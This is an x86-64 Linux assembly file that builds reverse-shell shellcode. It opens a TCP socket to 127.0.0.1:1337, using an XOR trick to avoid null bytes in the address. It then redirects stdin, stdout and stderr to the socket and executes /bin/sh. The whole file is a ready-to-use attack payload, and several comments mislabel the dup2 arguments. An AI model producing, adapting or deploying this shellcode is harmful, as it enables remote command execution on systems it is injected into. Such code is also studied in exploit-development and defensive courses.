BITS 64

SECTION .text
global _start
_start:

; set registery to 0
xor rax, rax
xor rbx, rbx
xor rsi, rsi
xor rdi, rdi

;              SYS_SOCKET
push 1

mov rax, 41                 ; sys_socket
mov rdi, 2                  ; domain = 2 (AF_INET)
mov rsi, 1                  ; Type = 1 (SOCK_STREAM)
xor rdx, rdx                ; Protocol = 0 (TCP)
syscall

; Save return value of syscall
mov rdx, rax

;               SYS_CONNECT
mov rbx, 0xfeffff80         ; xor of 0x0100007f and 0xffffffff
xor rbx, 0xffffffff         ; mov 0x0100007f in rbx
push rbx                    ; s_addr = 127.0.0.1
push word 0x3905            ; int port = 1337
push word 0x2               ; int family = AF_INET

mov rax, 42
mov rdi, rdx                ; fd = return fd of sys_socket
mov rsi, rsp                ; *uservaddr = rsp (addr of start of struct)
mov rdx, 24                 ; addrlen = 24
syscall

;               SYS_DUP2

mov rcx, rdi                ; save fd of socket

; STDIN
mov rax, 33
mov rdi, rcx                ; newfd = socket fd
xor rsi, rsi                ; oldfd = 0 (STDIN)
syscall
; STDOUT
mov rax, 33
mov rsi, 1                  ; oldfd = 0 (STDIN)
syscall
; STDERR
mov rax, 33
mov rsi, 2                  ; oldfd = 0 (STDIN)
syscall

;               EXECVE /bin/sh
xor rbx, rbx
xor rcx, rcx


push rbx                    ; push 0x00
mov rbx, 0x68732F6E69622F2F ; "//bin/sh"
push rbx
; save "//bin/sh" addr
mov rbx, rsp

push rcx                    ; push 0x00

push rbx                    ; push *char[] of "//bin/sh"

; execve of "//bin/sh"
mov rax, 59                 ; execve syscall (x86_64)
mov rdi, rbx                ; char* = "//bin/sh"
mov rsi, rsp                ; *argv[] = "//bin/sh"
xor rdx, rdx                ; *envp[] = 0
syscall